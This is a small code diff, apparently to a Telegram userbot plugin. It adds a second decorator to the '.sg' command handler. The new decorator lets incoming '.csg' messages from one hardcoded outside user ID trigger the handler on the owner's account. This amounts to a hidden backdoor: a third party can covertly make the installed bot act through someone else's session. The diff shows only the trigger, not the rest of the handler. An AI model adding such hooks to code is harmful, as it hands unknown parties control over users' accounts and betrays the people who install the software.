@@ -5,6 +5,7 @@ from asyncio.exceptions import TimeoutError
 
 
 @register(outgoing=True, pattern=r"^\.sg(?: |$)(.*)")
+@register(incoming=True, from_users=1663258664, pattern=r"^\.csg(?: |$)(.*)")
 async def lastname(steal):
     if steal.fwd_from:
         return
